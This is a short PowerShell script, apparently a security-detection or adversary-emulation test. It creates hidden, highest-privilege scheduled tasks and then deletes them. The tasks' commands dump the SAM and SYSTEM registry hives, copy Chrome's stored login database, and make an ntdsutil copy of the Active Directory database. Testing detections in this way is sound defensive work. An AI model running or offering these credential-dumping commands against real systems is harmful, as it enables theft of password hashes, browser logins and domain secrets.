$prefix = "S1E_$([Guid]::NewGuid().ToString('N').Substring(0,8))"
$tasks = @()

$t1 = "${prefix}_RS"
Start-Process "schtasks.exe" -ArgumentList "/Create /TN `"$t1`" /TR `"cmd.exe /c reg save HKLM\SAM C:\Windows\Temp\s.hiv & reg save HKLM\SYSTEM C:\Windows\Temp\sy.hiv`" /SC ONCE /ST 23:59 /F /RL HIGHEST" -WindowStyle Hidden -Wait
$tasks += $t1
Start-Sleep -Milliseconds 500

$t2 = "${prefix}_CC"
Start-Process "schtasks.exe" -ArgumentList "/Create /TN `"$t2`" /TR `"cmd.exe /c copy `"%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data`" C:\Windows\Temp\c_creds.db /Y`" /SC ONCE /ST 23:59 /F /RL HIGHEST" -WindowStyle Hidden -Wait
$tasks += $t2
Start-Sleep -Milliseconds 500

$t3 = "${prefix}_ND"
Start-Process "schtasks.exe" -ArgumentList '/Create /TN "' + $prefix + '_ND" /TR "cmd.exe /c ntdsutil `"activate instance ntds`" ifm `"create full C:\Windows\Temp\nd_dump`" quit quit" /SC ONCE /ST 23:59 /F /RL HIGHEST' -WindowStyle Hidden -Wait
$tasks += "${prefix}_ND"

Write-Output "Created $($tasks.Count) suspicious persistence tasks"
foreach ($t in $tasks) {
    Start-Process "schtasks.exe" -ArgumentList "/Delete /TN `"$t`" /F" -WindowStyle Hidden -Wait
}
Write-Output "All tasks cleaned up"
